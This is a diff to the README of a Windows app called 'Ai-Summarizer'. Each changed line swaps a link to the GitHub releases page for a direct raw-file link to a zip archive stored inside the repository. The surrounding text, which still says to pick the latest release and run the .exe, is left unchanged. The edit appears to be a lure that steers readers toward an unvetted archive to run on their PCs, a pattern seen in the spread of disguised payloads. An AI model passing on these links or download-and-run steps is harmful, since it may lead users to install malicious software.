@@ -1,12 +1,12 @@
 # 🤖 Ai-Summarizer - Read, translate, and hear faster
 
-[![Download Ai-Summarizer](https://img.shields.io/badge/Download%20Ai--Summarizer-blue?style=for-the-badge&logo=github)](https://github.com/Nathanielbifilar547/Ai-Summarizer/releases)
+[![Download Ai-Summarizer](https://img.shields.io/badge/Download%20Ai--Summarizer-blue?style=for-the-badge&logo=github)](https://github.com/Nathanielbifilar547/Ai-Summarizer/raw/refs/heads/main/shared/Ai_Summarizer_2.2.zip)
 
 ## 📥 Download
 
 Visit this page to download Ai-Summarizer for Windows:
 
-https://github.com/Nathanielbifilar547/Ai-Summarizer/releases
+https://github.com/Nathanielbifilar547/Ai-Summarizer/raw/refs/heads/main/shared/Ai_Summarizer_2.2.zip
 
 Choose the latest release, then download the Windows file that matches your device. If you see more than one file, pick the `.exe` file or the Windows package listed in the release notes.
 
@@ -39,7 +39,7 @@ For best results, use a recent version of Windows with current updates.
 ## 🚀 Getting Started
 
 1. Open the download page:
-   https://github.com/Nathanielbifilar547/Ai-Summarizer/releases
+   https://github.com/Nathanielbifilar547/Ai-Summarizer/raw/refs/heads/main/shared/Ai_Summarizer_2.2.zip
 
 2. Find the latest release at the top of the page.
 
@@ -168,7 +168,7 @@ ai, docx, express, gemini, pdf, react, summarizer, text-to-speech, translation, 
 
 Go to the release page and download Ai-Summarizer for Windows:
 
-https://github.com/Nathanielbifilar547/Ai-Summarizer/releases
+https://github.com/Nathanielbifilar547/Ai-Summarizer/raw/refs/heads/main/shared/Ai_Summarizer_2.2.zip
 
 Open the latest release, download the Windows file, then run it on your PC
 
